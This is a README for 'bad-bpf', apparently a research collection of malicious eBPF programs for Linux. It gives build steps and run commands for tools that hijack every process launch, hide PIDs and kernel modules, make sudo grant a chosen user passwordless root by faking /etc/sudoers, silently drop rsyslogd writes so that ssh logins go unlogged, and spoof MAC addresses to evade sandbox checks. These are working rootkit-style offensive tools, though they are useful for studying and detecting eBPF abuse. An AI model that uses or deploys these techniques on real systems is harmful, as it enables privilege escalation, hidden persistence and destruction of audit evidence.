# Bad BPF
A collection of malicious eBPF programs that make use of eBPF's ability to
read and write user data in between the usermode program and the kernel.

- [Overview](#Overview)
- [To Build](#Build)
- [To Run](#Run)
- [Availible Programs](#Programs)


# Overview
See my blog for an overview on how these programs work and why
this is interesting: https://blog.tofile.dev/2021/....

# Build
To use pre-build binaries, grab them from the [Releases](https://github.com/pathtofile/bad-bpf/releases) page.

To build from source, do the following:

## Dependecies
To build and run all the examples, you will need a Linux kernel version of at least [4.7](https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md).

As this code makes use of CO-RE, it requires a recent version of Linux that has BTF Type information.
See [these notes in the libbpf README](https://github.com/libbpf/libbpf/tree/master#bpf-co-re-compile-once--run-everywhere)
for more information. For example Ubuntu requries `Ubuntu 20.10`+.

To build it requires these dependecies:
- zlib
- libelf
- libbfd
- clang 11
- make

On Ubuntu these can be installed by
```bash
sudo apt install build-essential clang-11 libelf-dev zlib1g-dev libbfd-dev libcap-dev libfd-dev
```

## Build
To Build from source, recusivly clone the respository the run `make` in the `src` directory to build:
```bash
git clone --recusrive https://github.com/pathtofile/bad-bpf.git
cd bad-bpf/src
make
```
The binaries will built into `bad-bpf/src/bin`.

# Run
To run, launch each program as `root`. Every program has a `--help` option
that has required arguemnts and examples.

# Programs
## Common Arguments
As well as `--help`, every program also has a `--target-ppid`/`-t`.
This option restricts the programs' operation to only programs that are children
of the process matching this PID. This demonstrates to how affect some programs, but not others.


- [BPF-DOS](#BPF-Dos)
- [Exec-Hijack](#Exec-Hijack)
- [Pid-Hide](#Pid-Hide)
- [Sudo-Add](#Sudo-Add)
- [Write-Blocker](#Write-Blocker)
- [Text-Replace](#Text-Replace)
    - [Kernel Module hiding](#Text-Replace)
    - [MAC Address spoofer](#Text-Replace)
- [Text-Replace2](#Text-Replace2)
    - [Altering Configuration](#Text-Replace2)
    - [Running Detached](#Text-Replace2)

## BPF-Dos
```bash
sudo ./bpfdos
```
This program raises a `SIG_KILL` signal to any program attempting to use the `ptrace` syscall, e.g. `strace`.
Once bpf-dos starts you can test it by running:
```bash
strace /bin/whoami
```


## Exec-Hijack
```bash
sudo ./exechijack
```
This program intercepts all `execve` calls (used to create new processes) and instead makes then call
`/a`. To run, first ensure there is a program in the root dir `/a` (probably best to make is executable by all).
`bad-bpf` builds a simple program `hijackee` that simply prints out the `uid` and `argv[0]`, so you can use that:
```bash
make
sudo cp ./bin/hijackee /a
sudo chmod ugo+rx /a
```

Then just run `sudo ./bin/exechijack`.


## Pid-Hide
```
sudo ./pidhide --pid-to-hide 2222
```
This program hides the process matching this pid from tools such as `ps`.

It works by hooking the `getdents64` syscall, as `ps` works by looking for every sub-folder
of `/proc/`. PidHide unlinks the folder matching the PID, so `ps` only sees the folders before
and after it.


## Sudo-Add
```
sudo ./sudoadd --username lowpriv-user
```
This program allows a normally low-privledged user to use `sudo` to become root.

It works by intercepting `sudo`'s reading of the `/etc/sudoers` file, and overwriting the first line
with `<username> ALL=(ALL:ALL) NOPASSWD:ALL #`. This tricks sudo into thinking the user is allowed to become
root. Other programs such as `cat` or `sudoedit` are unnafected, so to those programs the file is unchanged
and the user does not have those privliges. The `#` at the end of the line ensures the rest of the line
is trated as a comment, so it doesn't currup the file's logic.


## Write-Blocker
```
sudo ./writeblocker --pid 508
```
This program intercepts all write syscall for a given process PID.
Instead of passing the data to the actual write syscall, writeblocker will instead
fake the call, returning the same number of bytes that the userspaceprogram expects
to be written.

For example, if you block the writes for the `rsyslogd` process, ssh logins will
not be written to `/var/log/auth.log`.


## Text-Replace
```
sudo ./textreplace --filename /path/to/file --input foo --replace bar
```
This program replaces all text matching `input` in the file with the `replace` text.
This has a number of uses, for example:

To hide kernel module `joydev` from tools such as `lsmod`:
```bash
./textreplace -f /proc/modules -i 'joydev' -r 'cryptd'
```

Spoof the MAC address of the `eth0` interface:
```bash
/textreplace -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'
```
Malware conducting anti-sandbox checks might check the MAC address to look for signs it is
running inside a Virtual Machine or Sandbox, and not on a 'real' machine.


**NOTE:** Both `input` and `replace` must be the same length, to avoid adding NULL characters to the
middle of a block of text. To enter a newline from a bash prompt, use `$'\n'`, e.g. `--replace $'text\n'`.


## Text-Replace2
This program works the same as `Text-Replace`, however it has two extra features:
- The program's configuration is alterable at runtime using eBPF Maps.
- The userspace loader can detach and exit

### Altering Configuration
The filename is stored in the eBPF Map `map_filename`. The Key is always `0`, and the value matches this struct:
```c
struct tr_file {
    char filename[50];
    unsigned int filename_len;
};
```
That is, 50 ascii characters, then an unsigned int mathcing the length of the actual filename string.

The easiest way to view and alter eBPF maps is using `bpftool`:
```bash
# List current config
bpftool map dump name map_text

# Alter filename to be 'AAAA'
bpftool map update name map_text \
    key hex 00 00 00 00 \
    value hex 61 61 61 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00

# Confirm change config
bpftool map dump name map_text
```

To alter the text to find and replace, alter the items in the Map `map_text`. The text to find is at key `0`, and the text to replace is key `1`.
The values will each match this struct:
```c
struct tr_text {
    char text[20];
    unsigned int text_len;
};
```


### Running Detached
By running the program with `--detach`, the userspace loader can exit without stopping the eBPF Programs.
Before running, first make sure the bpf filesystem is mounted:
```bash
sudo mount bpffs -t bpf /sys/fs/bpf
```

Then you can run text-replace2 detached:
```bash
./textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd' --detach
```

This will create a number of eBPF Link files under `/sys/fs/bpf/textreplace`.
Once loader has sucessfully run, you can check the logs by running:
```bash
sudo cat /sys/kernel/debug/tracing/trace_pipe
# confirm link files are there
sudo ls -l /sys/fs/bpf/textreplace
```

Then to stop, simply delete the link files:
```bash
sudo rm -r /sys/fs/bpf/textreplace
```
